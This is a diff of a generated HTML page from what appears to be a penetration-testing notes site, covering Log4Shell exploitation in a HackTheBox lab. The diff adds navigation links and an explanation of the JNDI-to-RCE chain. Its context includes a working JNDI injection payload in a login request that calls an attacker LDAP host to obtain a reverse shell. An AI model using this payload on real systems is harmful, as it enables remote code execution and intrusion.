@@ -597,6 +597,10 @@
       
         
       
+        
+      
+        
+      
     
     
     
@@ -2188,6 +2192,27 @@
   
   
     <li class="md-nav__item">
+      <a href="../medusa/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    medusa
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../metasploit/" class="md-nav__link">
         
   
@@ -3348,6 +3373,27 @@
   
   <span class="md-ellipsis">
     sqlplus
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sqsh/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    sqsh
   </span>
   
 
@@ -11384,14 +11430,16 @@ indeed vulnerable since it is trying to connect back to us on the LDAP port 389.
 </span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a>{&quot;username&quot;:&quot;lala&quot;,&quot;password&quot;:&quot;lele&quot;,&quot;remember&quot;:&quot;${jndi:ldap://10.10.14.2:1389/o=tomcat}&quot;,&quot;strict&quot;:true}
 </span></code></pre></div>
 <p>Once we send that request, our jndi server will resend the reverse shell:</p>
-<p><img alt="jndi server" src="./" /></p>
+<p><img alt="jndi server" src="log4j.png" /></p>
 <p>And in our terminal with the nc listener we will get the reverse shell.</p>
+<p>The misinterpretation of the User-Agent leads to a JNDI lookup which is executed as a command from the system with administrator privileges and queries a remote server controlled by the attacker, which in our case is the <code>Destination</code> in our concept of attacks. This query requests a Java class created by the attacker and is manipulated for its own purposes. The queried Java code inside the manipulated Java class gets executed in the same process, leading to a remote code execution (<code>RCE</code>) vulnerability. GovCERT.ch has created an excellent graphical representation of the Log4j vulnerability worth examining in detail. Source: https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/</p>
+<p><img alt="log4j" src="log4j_1.png" /></p>
 <h2 id="related-labs">Related labs</h2>
 <p><a href="../htb-unified/">Walkthrough HackTheBox machine: Unified</a>.</p>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2023-11-25T11:50:11+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2023-11-25</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2023-11-27T18:22:15+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2023-11-27</span></small></br>
 
 
     <small>Created: May 8, 2023 16:05:42</small>
